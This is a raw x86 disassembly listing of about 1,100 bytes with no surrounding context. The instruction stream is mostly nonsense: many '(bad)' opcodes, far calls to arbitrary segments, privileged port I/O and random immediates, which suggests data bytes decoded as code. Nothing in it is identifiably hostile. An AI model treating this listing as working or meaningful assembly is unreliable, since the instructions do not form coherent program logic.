  418793:	xor    al,0xf4
  418795:	mov    ah,0xcd
  418797:	cmp    bl,BYTE PTR [eax-0x7c]
  41879a:	or     dh,ch
  41879c:	adc    eax,0x96ab607d
  4187a1:	loope  0x4187b3
  4187a3:	push   0xffffffd9
  4187a5:	fwait
  4187a6:	xlat   BYTE PTR ds:[ebx]
  4187a7:	ja     0x4187f6
  4187a9:	add    al,0xb1
  4187ab:	mov    eax,0x444f9556
  4187b0:	add    BYTE PTR [esi-0x778a9100],bl
  4187b6:	outs   dx,BYTE PTR ds:[esi]
  4187b7:	ret    
  4187b8:	les    edi,FWORD PTR [ebx+0x1bfeaa7d]
  4187be:	stc    
  4187bf:	fmul   st,st(2)
  4187c1:	clc    
  4187c2:	sbb    bl,BYTE PTR ds:0xb35a2c35
  4187c8:	inc    edi
  4187c9:	add    esp,DWORD PTR [edi+0x3b]
  4187cc:	stos   BYTE PTR es:[edi],al
  4187cd:	and    ebp,DWORD PTR [ebx+0x7]
  4187d0:	jp     0x4187b1
  4187d2:	mov    esp,0x45dc83f0
  4187d7:	mov    ds:0x20a321ee,al
  4187dc:	mov    al,0x47
  4187de:	retf   0x3d57
  4187e1:	inc    ebp
  4187e2:	pop    ecx
  4187e3:	in     eax,0x44
  4187e5:	sbb    edx,DWORD PTR [edx-0xffe3169]
  4187eb:	or     al,0xe6
  4187ed:	dec    esp
  4187ee:	add    BYTE PTR [ebx],ah
  4187f0:	das    
  4187f1:	ret    0x521c
  4187f4:	add    ebx,DWORD PTR [esp+edx*2+0x70faa728]
  4187fb:	les    esp,FWORD PTR [esi+eiz*4]
  4187fe:	dec    edx
  4187ff:	cmovp  esi,DWORD PTR [edx-0x37fca442]
  418806:	adc    eax,0x35bf6262
  41880b:	jmp    0x8fdc:0xb8177990
  418812:	sti    
  418813:	nop
  418814:	or     al,0x3b
  418816:	sub    DWORD PTR [edx],eax
  418818:	pop    edx
  418819:	fwait
  41881a:	pop    ss
  41881b:	push   ds
  41881c:	(bad)  
  41881d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41881e:	add    al,0x56
  418820:	mov    bh,0x64
  418822:	push   ebx
  418823:	jo     0x4187ff
  418825:	das    
  418826:	inc    ebp
  418827:	push   0xf
  418829:	jbe    0x41880d
  41882b:	fld    DWORD PTR [edi]
  41882d:	out    dx,al
  41882e:	iret   
  41882f:	add    al,0xa6
  418831:	and    eax,0x4b98c4c9
  418836:	fwait
  418837:	shr    BYTE PTR [ebx+0x2c],0xcd
  41883b:	scas   eax,DWORD PTR es:[edi]
  41883c:	inc    ebx
  41883d:	(bad)  
  41883e:	aaa    
  41883f:	enter  0xf658,0x50
  418843:	dec    ebp
  418844:	mov    DWORD PTR [edx+eiz*4-0x1],ebx
  418848:	icebp  
  418849:	psrlq  mm3,QWORD PTR es:[ebp-0x543b9532]
  418851:	mov    edx,0x1e592e9
  418856:	sbb    eax,0x1d54370f
  41885b:	xchg   edx,eax
  41885c:	sub    BYTE PTR [ebx+0xf979d97],ah
  418862:	cwde   
  418863:	cwde   
  418864:	sbb    DWORD PTR [eax],ebp
  418866:	mov    ebx,DWORD PTR [eax]
  418868:	dec    ecx
  418869:	lea    edi,[esi+0x28a49d24]
  41886f:	aas    
  418870:	lods   al,BYTE PTR ds:[esi]
  418871:	call   0xd6f43055
  418876:	jg     0x41881a
  418878:	sbb    ebp,ebx
  41887a:	je     0x418891
  41887c:	mov    bh,cl
  41887e:	cmpxchg DWORD PTR [edi],edx
  418881:	fs jle 0x41881d
  418884:	mov    ebx,0x2d308ec
  418889:	stc    
  41888a:	aad    0x70
  41888c:	shl    ebx,cl
  41888e:	mov    al,ds:0x5b5fd58c
  418893:	sub    ebp,esi
  418895:	fcom   DWORD PTR [ebx+0x2ed77281]
  41889b:	xor    esp,DWORD PTR [eax+0x6c976f6f]
  4188a1:	arpl   WORD PTR ds:0x9f5c250f,ax
  4188a7:	jl     0x418885
  4188a9:	out    dx,eax
  4188aa:	lahf   
  4188ab:	mov    ah,BYTE PTR [edx]
  4188ad:	and    cl,BYTE PTR [eax-0x54]
  4188b0:	nop
  4188b1:	sub    DWORD PTR [ebx-0x74],ebx
  4188b4:	adc    ebp,DWORD PTR [edx+eiz*2]
  4188b7:	lds    ebp,FWORD PTR [esi]
  4188b9:	jmp    0x41890d
  4188bb:	sub    ch,0xf0
  4188be:	dec    ebp
  4188bf:	and    ah,cl
  4188c1:	test   al,0xd3
  4188c3:	call   0x4ebd:0xf0c81b32
  4188ca:	pop    edi
  4188cb:	cmp    al,0xf1
  4188cd:	ficom  WORD PTR [ecx]
  4188cf:	dec    eax
  4188d0:	ror    bh,cl
  4188d2:	test   eax,0x301c64f5
  4188d8:	call   0xc27f5e14
  4188dd:	call   0x30709ba8
  4188e2:	jmp    0xad72:0xba3b0737
  4188e9:	inc    esi
  4188ea:	xor    ebp,DWORD PTR [esi+0x6e]
  4188ed:	cmp    bh,0xac
  4188f0:	iret   
  4188f1:	dec    ecx
  4188f2:	std    
  4188f3:	inc    ecx
  4188f4:	add    BYTE PTR [ecx],ch
  4188f6:	std    
  4188f7:	call   0x18d9b48a
  4188fc:	cld    
  4188fd:	jns    0x4188f0
  4188ff:	out    dx,al
  418900:	or     al,0x1d
  418902:	jbe    0x418948
  418904:	pop    ss
  418905:	or     al,0x98
  418907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418908:	pop    es
  418909:	cld    
  41890a:	cmp    eax,0xffffffbd
  41890d:	jecxz  0x41889b
  41890f:	enter  0xcaea,0xa1
  418913:	cli    
  418914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418915:	das    
  418916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418917:	dec    eax
  418918:	pop    edx
  418919:	pushf  
  41891a:	push   ss
  41891b:	aam    0x64
  41891d:	popa   
  41891e:	in     al,dx
  41891f:	xorps  xmm3,XMMWORD PTR [esi]
  418922:	arpl   WORD PTR [edi+0x20fd3372],bp
  418928:	mov    ebx,0x5011dbf4
  41892d:	bound  esp,QWORD PTR [ebp+0x7f]
  418930:	retf   0xd908
  418933:	xor    BYTE PTR [edx],ah
  418935:	call   0x6b44258a
  41893a:	sbb    al,0x7a
  41893c:	mov    ebp,0x71462b4f
  418941:	das    
  418942:	repnz fnstenv [ecx-0x55]
  418946:	jecxz  0x4189aa
  418948:	sub    BYTE PTR [ebp+0x648ef729],ah
  41894e:	xor    cl,BYTE PTR [ebp+0x5d]
  418951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418952:	imul   ecx,DWORD PTR [esp+esi*1-0x58ef73c3],0xec743ded
  41895d:	das    
  41895e:	les    esp,FWORD PTR [ebx-0x132ad648]
  418964:	fs xchg ebx,eax
  418966:	(bad)  
  418968:	sbb    BYTE PTR [edx+edi*8],dl
  41896b:	fmulp  st(3),st
  41896d:	ds ins DWORD PTR es:[edi],dx
  41896f:	xchg   edi,eax
  418970:	gs retf 0x2174
  418974:	out    dx,eax
  418975:	dec    ebx
  418976:	ins    BYTE PTR es:[edi],dx
  418977:	mov    ds:0xc11875d1,al
  41897c:	inc    ebp
  41897d:	ins    DWORD PTR es:[edi],dx
  41897e:	fnsave [ebp-0x22afa3bb]
  418984:	(bad)  
  418985:	js     0x4189b1
  418987:	and    DWORD PTR [esi-0x51],ecx
  41898a:	add    al,0x86
  41898c:	mov    ebp,0x8aa27fab
  418991:	jmp    0x418918
  418993:	out    dx,al
  418994:	test   BYTE PTR [edi+ebx*8-0x3f1a0f0],al
  41899b:	jmp    0xc544:0x176b013c
  4189a2:	pop    es
  4189a3:	loopne 0x4189e1
  4189a5:	xchg   BYTE PTR [ecx+0x2c79d04e],bl
  4189ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189ac:	jo     0x418951
  4189ae:	xorps  xmm6,xmm7
  4189b1:	mov    ah,0x6b
  4189b3:	jmp    0x6934d28a
  4189b8:	retf   0x450f
  4189bb:	cmp    al,0x3c
  4189bd:	push   ebx
  4189be:	pop    esp
  4189bf:	jecxz  0x418a1f
  4189c1:	repz fldenv [ebx]
  4189c4:	xchg   BYTE PTR [ecx],cl
  4189c6:	sar    ebp,cl
  4189c8:	(bad)  
  4189c9:	out    0xa1,eax
  4189cb:	mov    ah,0x40
  4189cd:	xchg   BYTE PTR [ebx-0x31aea56],al
  4189d3:	inc    ecx
  4189d4:	mov    cl,0xcd
  4189d6:	stos   BYTE PTR es:[edi],al
  4189d7:	(bad)
  4189db:	jle    0x4189b8
  4189dd:	retf   0x71ce
  4189e0:	mov    eax,ds:0x39bd0a4c
  4189e5:	mov    ds:0x50b9b724,eax
  4189ea:	xchg   ecx,eax
  4189eb:	lock je 0x4189a2
  4189ee:	or     DWORD PTR [esi],eax
  4189f0:	rcl    al,cl
  4189f2:	gs hlt 
  4189f4:	inc    esi
  4189f5:	jb     0x4189b7
  4189f7:	test   eax,0xb1e8c557
  4189fc:	scas   eax,DWORD PTR es:[edi]
  4189fd:	arpl   WORD PTR ds:0x75897f62,bp
  418a03:	mov    cl,0xb6
  418a05:	(bad)  
  418a06:	call   0xae5b6e32
  418a0b:	arpl   WORD PTR [eax],si
  418a0d:	jle    0x418a89
  418a0f:	ficom  WORD PTR [esi]
  418a11:	push   ecx
  418a12:	in     eax,dx
  418a13:	or     eax,0xb75edc3a
  418a18:	xchg   ebx,eax
  418a19:	pop    ds
  418a1a:	test   eax,0x1319feee
  418a1f:	dec    ebp
  418a20:	or     DWORD PTR [ebx-0x4e09d31b],edi
  418a26:	pop    eax
  418a27:	retf   
  418a28:	leave  
  418a29:	shl    BYTE PTR [eax+edx*1-0x8],1
  418a2d:	and    DWORD PTR [edi-0x1076e4e],eax
  418a33:	(bad)  
  418a34:	std    
  418a35:	adc    BYTE PTR [ebx+0x70964723],dl
  418a3b:	arpl   WORD PTR [ebp-0x2f25c245],cx
  418a41:	and    BYTE PTR [ebx],0x9a
  418a44:	cdq    
  418a45:	test   BYTE PTR [edx+ecx*8-0x39],0xb9
  418a4a:	cmp    ebx,DWORD PTR [ebp+0x7e]
  418a4d:	lahf   
  418a4e:	mov    ch,cl
  418a50:	mov    ecx,0xbfb72be8
  418a55:	pusha  
  418a56:	retf   0xadac
  418a59:	jnp    0x418a9a
  418a5b:	data16 int3 
  418a5d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5f:	dec    ecx
  418a60:	sub    BYTE PTR [ecx],bl
  418a62:	mov    esi,0xff1de36f
  418a67:	mov    bh,0x27
  418a69:	fild   WORD PTR [ebx-0x13]
  418a6c:	int    0x85
  418a6e:	mov    ss,WORD PTR [esi]
  418a70:	mov    ebp,0xd6af547a
  418a75:	in     eax,dx
  418a76:	mov    ds:0x16981850,eax
  418a7b:	ins    BYTE PTR es:[edi],dx
  418a7c:	and    DWORD PTR cs:[ecx-0x269abbf2],esp
  418a83:	lahf   
  418a84:	xchg   edi,eax
  418a85:	inc    esp
  418a86:	in     al,dx
  418a87:	in     al,dx
  418a88:	cmp    al,0x53
  418a8a:	dec    ebx
  418a8b:	xor    edi,DWORD PTR [ecx]
  418a8d:	pop    ebp
  418a8e:	inc    eax
  418a8f:	jnp    0x418aa0
  418a91:	(bad)  
  418a92:	scas   al,BYTE PTR es:[edi]
  418a93:	sti    
  418a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a95:	(bad)
  418a98:	call   0x45b2:0xbee6ba8d
  418a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aa0:	sub    ebx,ebx
  418aa2:	or     al,0xaa
  418aa4:	and    BYTE PTR [eax+0x26a58492],0xdf
  418aab:	mov    dh,0x38
  418aad:	mov    ds:0xb71a65c9,al
  418ab2:	call   0xfe74d3c2
  418ab7:	pop    ebx
  418ab8:	test   al,0x5c
  418aba:	jne    0x418a72
  418abc:	je     0x418aa9
  418abe:	test   al,0xb5
  418ac0:	(bad)  
  418ac1:	sbb    esp,edi
  418ac3:	arpl   WORD PTR [edx+0x39a7416b],dx
  418ac9:	js     0x418ad5
  418acb:	xlat   BYTE PTR ds:[ebx]
  418acc:	mov    ds:0x7101dd98,eax
  418ad1:	jne    0x418ab6
  418ad3:	mov    dh,0x9b
  418ad5:	out    dx,eax
  418ad6:	push   ebx
  418ad7:	jae    0x418a9b
  418ad9:	call   0x2ca7:0x826ff09a
  418ae0:	add    BYTE PTR [ebx+ebp*2],bl
  418ae3:	mov    cl,0xb4
  418ae5:	scas   eax,DWORD PTR es:[edi]
  418ae6:	jg     0x418b03
  418ae8:	jno    0x418b18
  418aea:	fisub  DWORD PTR [edx+0x60]
  418aed:	mov    cl,0xbe
  418aef:	popa   
  418af0:	retf   
  418af1:	cli    
  418af2:	repz jns 0x418aa2
  418af5:	lods   al,BYTE PTR ds:[esi]
  418af6:	cs add eax,0xb5eb7ba6
  418afc:	call   0x57ba:0x377cbb77
  418b03:	mov    DWORD PTR [ebp-0x67e1c8b4],ecx
  418b09:	or     BYTE PTR [ebx],dl
  418b0b:	retf   0xf271
  418b0e:	sub    ah,ah
  418b10:	pop    es
  418b11:	retf   
  418b12:	mov    ecx,0xb29d3c1
  418b17:	into   
  418b18:	mov    ah,0x5b
  418b1a:	div    BYTE PTR [eax+0x35926095]
  418b20:	scas   al,BYTE PTR es:[edi]
  418b21:	ss jge 0x418b59
  418b24:	cwde   
  418b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b26:	mov    edx,ecx
  418b28:	ds out dx,eax
  418b2a:	mov    edi,0x932b48ee
  418b2f:	inc    ecx
  418b30:	sub    al,0x68
  418b32:	or     bh,BYTE PTR [esi-0x7c]
  418b35:	inc    ecx
  418b36:	rol    BYTE PTR [ebp+0x6de1e45b],0x1a
  418b3d:	mov    edx,0x5ea9c157
  418b42:	call   0x46cc:0x525d54f6
  418b49:	sti    
  418b4a:	cmp    al,0x7d
  418b4c:	sub    ch,dh
  418b4e:	push   ecx
  418b4f:	data16 in al,dx
  418b51:	mov    dh,0x14
  418b53:	and    esp,DWORD PTR [eax-0x21]
  418b56:	sbb    BYTE PTR [eax-0x4436a189],bh
  418b5c:	adc    eax,DWORD PTR [ebx]
  418b5e:	and    al,0x1e
  418b60:	dec    esi
  418b61:	imul   edx,DWORD PTR [esi],0xffffffb2
  418b64:	sahf   
  418b65:	mov    ah,0xb2
  418b67:	imul   eax,DWORD PTR [ebp-0x27aa8a08],0xb350fdec
  418b71:	pop    esi
  418b72:	dec    esi
  418b73:	inc    ecx
  418b74:	pop    ds
  418b75:	pushf  
  418b76:	mov    al,ds:0x5a7608bb
  418b7b:	pop    ebx
  418b7c:	inc    ebp
  418b7d:	push   cs
  418b7e:	(bad)  
  418b7f:	fs sbb al,0x48
  418b82:	add    al,BYTE PTR [esi+0x6bbc68cb]
  418b88:	mov    ch,0x5b
  418b8a:	xor    eax,0x493dbd0
  418b8f:	or     al,0x7f
  418b91:	ins    BYTE PTR es:[edi],dx
  418b92:	retf   0x5d51
  418b95:	idiv   bh
  418b97:	and    edx,eax
  418b99:	push   ecx
  418b9a:	scas   eax,DWORD PTR es:[edi]
  418b9b:	pop    eax
  418b9c:	sahf   
  418b9d:	clc    
  418b9e:	fs shl bh,1
  418ba1:	mov    esi,0x734d9ad1
  418ba6:	ficom  DWORD PTR ds:0xf278d453
  418bac:	jno    0x418c0a
  418bae:	jle    0x418c0b
  418bb0:	cmp    eax,0xe8c5f6ef
  418bb5:	frstor [eax]
  418bb7:	ins    BYTE PTR es:[edi],dx
  418bb8:	push   ecx
  418bb9:	add    al,0xcf
  418bbb:	sub    eax,0x494e0b9d
  418bc0:	rcl    DWORD PTR ds:0xd480a026,1
  418bc6:	xor    ebx,DWORD PTR [edx]
  418bc8:	jle    0x418bfb
  418bca:	repnz std 
  418bcc:	or     al,0x7d
  418bce:	ret    
  418bcf:	retf   
  418bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd1:	sti    
  418bd2:	arpl   WORD PTR [eax-0x75210bed],bx
  418bd8:	(bad)  
  418bd9:	inc    eax
  418bda:	sbb    cl,BYTE PTR [edx+0x1cbde497]
  418be0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be1:	cmp    edi,esi
  418be3:	cmp    BYTE PTR [edx+0xa],cl
  418be6:	adc    BYTE PTR [edx+0x17],dh
  418be9:	loope  0x418b76
  418beb:	mov    fs,WORD PTR [edi-0x6c1cbefa]
  418bf1:	aaa    
  418bf2:	sbb    DWORD PTR [ebp+0x8f8a8f5],esi
  418bf8:	or     bh,dl
  418bfa:	adc    eax,DWORD PTR [edx+0xf]
  418bfd:	jae    0x418b94
  418bff:	inc    edx
  418c00:	shl    DWORD PTR [esi],1
  418c02:	adc    DWORD PTR [ebp+eax*8-0x77f22850],0xffffffa5
  418c0a:	mov    ds:0xf648add7,eax
  418c0f:	fstp   DWORD PTR [ebx+0x12]
  418c12:	aam    0xcc
  418c14:	shl    BYTE PTR [ecx-0x4c],0x38
  418c18:	repz pop esp
  418c1a:	mov    eax,0x38e9d9fa
  418c1f:	pop    es
  418c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c21:	or     DWORD PTR [esi-0x37],edx
  418c24:	jno    0x418c66
  418c26:	mov    ebx,0xe860160f
  418c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c2c:	fwait
  418c2d:	rcr    DWORD PTR [edi+0x708ec5a4],cl
  418c33:	sbb    al,0xfa
  418c35:	je     0x418bfb
  418c37:	cmp    BYTE PTR [edx],dh
  418c39:	adc    ah,cl
  418c3b:	mov    al,ds:0xded12d3b
  418c40:	push   esp
  418c41:	int    0xc8
  418c43:	mov    ecx,0x3579228b
  418c48:	sbb    DWORD PTR [ecx+0x6177503b],ebx
  418c4e:	loop   0x418cca
  418c50:	cs sbb esi,ecx
  418c53:	addr16 mov eax,0xa2a88a75
  418c59:	jecxz  0x418cb7
  418c5b:	aad    0x48
  418c5d:	add    eax,0xfa77aa69
  418c62:	mov    edi,0xed5f1969
  418c67:	sbb    DWORD PTR [eax+0x33f2109d],ecx
  418c6d:	jb     0x418cb4
  418c6f:	sbb    al,BYTE PTR [ecx+0x45d63d2]
  418c75:	int3   
  418c76:	fmul   QWORD PTR [ecx+0x8216978]
  418c7c:	lods   al,BYTE PTR ds:[esi]
  418c7d:	mov    ch,bh
  418c7f:	sbb    bl,dh
  418c81:	retf   0x5571
  418c84:	bound  esp,QWORD PTR [esi-0x5863c8d6]
  418c8a:	(bad)  
  418c8c:	cwde   
  418c8d:	jg     0x418ce7
  418c8f:	add    eax,0x1283db50
  418c94:	adc    al,0x16
  418c96:	mov    bh,0xd6
  418c98:	inc    ebp
  418c99:	mov    dh,bl
  418c9b:	push   0x52
  418c9d:	jb     0x418c72
  418c9f:	(bad)  
  418ca1:	xchg   DWORD PTR [edi],ecx
  418ca3:	inc    edx
  418ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ca5:	shr    DWORD PTR [eax-0xd488583],cl
  418cab:	inc    ebx
  418cac:	push   0x40c42b47
  418cb1:	push   cs
  418cb2:	mov    cl,0x29
  418cb4:	add    al,0x23
  418cb6:	imul   di,WORD PTR [eax],0xdcd5
  418cbb:	cs sbb esi,ebx
  418cbe:	scas   al,BYTE PTR es:[edi]
  418cbf:	ret    
  418cc0:	push   eax
  418cc1:	or     ebp,DWORD PTR [eax+ebp*8]
  418cc4:	pop    esp
  418cc5:	rcr    BYTE PTR [ecx-0x19],cl
  418cc8:	js     0x418c86
  418cca:	out    0x2d,al
  418ccc:	sbb    al,BYTE PTR [esi+eiz*4]
  418ccf:	popf   
  418cd0:	adc    edx,ecx
  418cd2:	imul   ecx,DWORD PTR [ebx+0xdc3c58],0xff59595c
  418cdc:	xchg   ebx,eax
  418cdd:	and    esi,DWORD PTR [esi-0x2a]
  418ce0:	adc    eax,0xd502f0c1
  418ce5:	jecxz  0x418cb0
  418ce7:	out    0xb9,eax
  418ce9:	dec    esp
  418cea:	in     al,dx
  418ceb:	stos   DWORD PTR es:[di],eax
  418ced:	adc    edx,ebp
  418cef:	jbe    0x418ce2
  418cf1:	and    BYTE PTR [edi-0x4193aa07],dh
  418cf7:	pop    esi
  418cf8:	xor    eax,0x813d9dc5
  418cfd:	sbb    esi,esp
  418cff:	pop    edx
  418d00:	push   es
  418d01:	mov    ebx,0xf59e8804
  418d06:	fdivrp st(6),st
  418d08:	neg    BYTE PTR [edi+0x40]
  418d0b:	retf   0xf125
  418d0e:	add    BYTE PTR [ebx-0x49],dh
  418d11:	pushf  
  418d12:	add    al,0x58
  418d14:	adc    BYTE PTR [ebp+0x4bcdfbbc],ch
  418d1a:	loope  0x418cab
  418d1c:	call   0xf5ef:0xa4e024b
  418d23:	sbb    al,0x72
  418d25:	cli    
  418d26:	inc    esi
  418d27:	jp     0x418d51
  418d29:	inc    BYTE PTR [ecx]
  418d2b:	pop    edx
  418d2c:	pop    eax
  418d2d:	push   ds
  418d2e:	cdq    
  418d2f:	mov    ds:0x676f89e1,al
  418d34:	fld    QWORD PTR [edx-0x18]
  418d37:	lods   al,BYTE PTR ds:[esi]
  418d38:	push   ebx
  418d39:	icebp  
  418d3a:	xchg   BYTE PTR [edx-0x37df4b0],bh
  418d40:	push   esp
  418d41:	mov    al,0x5c
  418d43:	mov    ch,0x93
  418d45:	dec    ecx
  418d46:	mov    esp,0xda4118f9
  418d4b:	cmp    BYTE PTR [ecx-0x1c],bl
  418d4e:	rcr    BYTE PTR [esp-0x5f0cc7c9],1
  418d55:	sbb    bh,al
  418d57:	outs   dx,BYTE PTR ds:[esi]
  418d58:	cdq    
  418d59:	jmp    0xc1c4:0xbb0b84c9
  418d60:	in     al,dx
  418d61:	xchg   edi,eax
  418d62:	jbe    0x418d31
  418d64:	pop    ebp
  418d65:	mov    eax,ds:0x504ca2ee
  418d6a:	pop    edx
  418d6b:	pop    ecx
  418d6c:	cdq    
  418d6d:	imul   edx,DWORD PTR [edx+0x1d],0xf11635d8
  418d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d75:	or     BYTE PTR [ecx],dh
  418d77:	cld    
  418d78:	mul    BYTE PTR [eax-0x1b05e4cf]
  418d7e:	xor    esi,DWORD PTR [edi]
  418d80:	mov    eax,ds:0x5b2736f5
  418d85:	pop    esi
  418d86:	retf   
  418d87:	dec    ebx
  418d88:	nop
  418d89:	pop    ebx
  418d8a:	mov    gs,WORD PTR [esi-0x3c]
  418d8d:	stos   BYTE PTR es:[edi],al
  418d8e:	or     ch,BYTE PTR [edx]
  418d90:	int3   
  418d91:	push   ecx
  418d92:	xor    ebx,0x36fe7cf3
  418d98:	jmp    0xdc2b:0xd60b2335
  418d9f:	loopne 0x418d3c
  418da1:	xchg   cl,al
  418da3:	data16 lahf 
  418da5:	cmc    
  418da6:	mov    ebx,DWORD PTR [eax+0x17]
  418da9:	cwde   
  418daa:	rol    ecx,1
  418dac:	mov    ds:0x2c8633b8,eax
  418db1:	and    bh,BYTE PTR [eax-0x51574e24]
  418db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418db8:	pop    es
  418db9:	repnz fisubr DWORD PTR [eax+0x62]
  418dbd:	loopne 0x418db8
  418dbf:	(bad)  
  418dc0:	fld    st(1)
  418dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dc3:	popa   
  418dc4:	iret   
  418dc5:	sub    BYTE PTR [esi+esi*1+0x7f3b8bc4],ch
  418dcc:	lds    esi,FWORD PTR [ebx+0x47]
  418dcf:	and    ch,BYTE PTR [edi+0x2c67169a]
  418dd5:	and    al,0x7d
  418dd7:	or     BYTE PTR [ebx],dh
  418dd9:	cld    
  418dda:	add    al,0x9d
  418ddc:	mov    esi,0x65ddc75b
  418de1:	test   DWORD PTR [esi-0x7f97054d],edx
  418de7:	xchg   edx,eax
  418de8:	dec    edx
  418de9:	push   esi
  418dea:	jno    0x418e61
  418dec:	dec    edx
  418ded:	stos   DWORD PTR es:[edi],eax
  418dee:	push   cs
  418def:	jmp    0x418dee
  418df1:	retf   0x2bd8
  418df4:	or     BYTE PTR [edx],ah
  418df6:	jnp    0x418e07
  418df8:	sbb    ecx,edx
  418dfa:	or     eax,DWORD PTR [ebx]
  418dfc:	(bad)  [ebp+0x21]
  418dff:	int    0x85
  418e01:	xchg   esi,eax
  418e02:	lods   al,BYTE PTR ds:[esi]
  418e03:	sub    ebp,esp
  418e05:	cmp    al,0xc
  418e07:	fild   DWORD PTR [ecx+0x7f]
  418e0a:	push   edx
  418e0b:	cmp    al,0x43
  418e0d:	mov    WORD PTR [ebx-0x13],es
  418e10:	test   DWORD PTR ds:0x8f70378c,0x2e5e41d2
  418e1a:	nop
  418e1b:	sub    ch,ah
  418e1d:	jb     0x418e34
  418e1f:	aam    0x6b
  418e21:	or     dh,ah
  418e23:	add    al,ah
  418e25:	idiv   BYTE PTR [edx-0x14d9a201]
  418e2b:	add    ch,dl
  418e2d:	shl    al,0x0
  418e30:	(bad)  
  418e31:	rcr    cl,1
  418e33:	jle    0x418e0f
  418e35:	mov    bh,0x51
  418e37:	inc    edi
  418e38:	ret    0x5f
  418e3b:	mov    ?,WORD PTR [edx]
  418e3d:	jnp    0x418de1
  418e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e40:	mov    cl,0x9a
  418e42:	cli    
  418e43:	int3   
  418e44:	mov    eax,cs:0x3502d15a
  418e4a:	sbb    al,0xe5
  418e4c:	test   eax,0xcde49f90
  418e51:	scas   eax,DWORD PTR es:[edi]
  418e52:	loopne 0x418e49
  418e54:	loope  0x418e43
  418e56:	pop    edx
  418e57:	inc    ecx
  418e58:	gs mov esp,0xde66437c
  418e5e:	pushf  
  418e5f:	call   0x30eed3df
  418e64:	idiv   BYTE PTR [esi+0x1a]
  418e67:	lock mov cs,WORD PTR [eax-0x3b]
  418e6b:	xor    ebx,ecx
  418e6d:	mov    ch,0xf2
  418e6f:	in     eax,dx
  418e70:	enter  0x891f,0xed
  418e74:	jecxz  0x418e79
  418e76:	in     eax,dx
  418e77:	repnz xor ah,BYTE PTR [ecx+0x48]
  418e7b:	push   0xffffff92
  418e7d:	cdq    
  418e7e:	xchg   BYTE PTR [edi+0x70],cl
  418e81:	xlat   BYTE PTR ds:[ebx]
  418e82:	jge    0x418ec1
  418e84:	inc    esp
  418e85:	clc    
  418e86:	aam    0xa9
  418e88:	dec    eax
  418e89:	scas   eax,DWORD PTR es:[edi]
  418e8a:	or     eax,0x2ef05c6f
  418e8f:	fsubr  DWORD PTR [ecx]
  418e91:	aaa    
  418e92:	in     al,0xb0
  418e94:	push   0x211d89a5
  418e99:	mov    al,ds:0xd98f7d3
  418e9e:	inc    ecx
  418e9f:	and    al,BYTE PTR [ebx]
  418ea1:	inc    eax
  418ea2:	mov    ds:0xa836cba6,eax
  418ea7:	ret    0xd8de
  418eaa:	mov    ds:0xe23583e7,al
  418eaf:	fs inc ecx
  418eb1:	push   esi
  418eb2:	(bad)  
  418eb3:	pop    ebp
  418eb4:	and    cl,bh
  418eb6:	loope  0x418ecd
  418eb8:	mov    dh,0x51
  418eba:	mov    DWORD PTR ds:0xf9637b8f,0x759d86fc
  418ec4:	and    ebp,ebp
  418ec6:	cmp    ch,BYTE PTR [esi-0x63]
  418ec9:	aam    0x27
  418ecb:	cmp    bl,BYTE PTR [esi-0x5448034a]
  418ed1:	call   0x2c83:0x967d59bd
  418ed8:	rcr    DWORD PTR [ebx+0x128367bc],1
  418ede:	adc    eax,0xd48bd58d
  418ee3:	cdq    
  418ee4:	push   eax
  418ee5:	neg    BYTE PTR [ebx+0x70]
  418ee8:	ret    0x1069
  418eeb:	scas   al,BYTE PTR es:[edi]
  418eec:	mov    eax,ds:0x8fbe9034
  418ef1:	mov    dh,BYTE PTR [edi+0x5135a04b]
  418ef7:	add    edi,DWORD PTR [ebx+0xb]
  418efa:	nop
  418efb:	push   ebp
  418efc:	xchg   esp,eax
  418efd:	cmc    
  418efe:	stos   DWORD PTR es:[edi],eax
  418eff:	cmp    al,0x26
  418f01:	sub    edi,esi
  418f03:	shl    dl,0x12
  418f06:	out    dx,eax
  418f07:	jg     0x418f29
  418f09:	push   0x82caf365
  418f0e:	iret   
  418f0f:	sub    BYTE PTR ds:0x57007759,ah
  418f15:	fstp   DWORD PTR [edi]
  418f17:	or     DWORD PTR [edx+eax*4+0x593d4007],ebp
  418f1e:	dec    edi
  418f1f:	(bad)  
  418f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f22:	mov    cl,ch
  418f24:	push   0x1f
  418f26:	adc    BYTE PTR [ecx-0x5],al
  418f29:	mov    edi,esi
  418f2b:	call   0x5abe:0xef314a1e
  418f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f33:	push   ds
  418f34:	test   DWORD PTR [eax+0x6e],ebx
  418f37:	and    bl,BYTE PTR [esi-0x1a]
  418f3a:	test   DWORD PTR [ecx],ecx
  418f3c:	fsubr  st(0),st
  418f3e:	lea    ebx,[ecx]
  418f40:	test   BYTE PTR [esi+0x4d],ah
  418f43:	push   0x41e4ad30
  418f48:	and    BYTE PTR [eax+0x6f6104ad],ah
  418f4e:	xchg   ebp,eax
  418f4f:	mov    eax,ds:0xbbfe7f72
  418f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f56:	and    DWORD PTR [edx],edi
  418f58:	das    
  418f59:	jnp    0x418f1d
  418f5b:	push   ds
  418f5c:	test   eax,0xe4664efa
  418f61:	out    0x87,al
  418f63:	hlt    
  418f64:	mov    eax,0x89ce9524
  418f69:	sbb    dh,0xa4
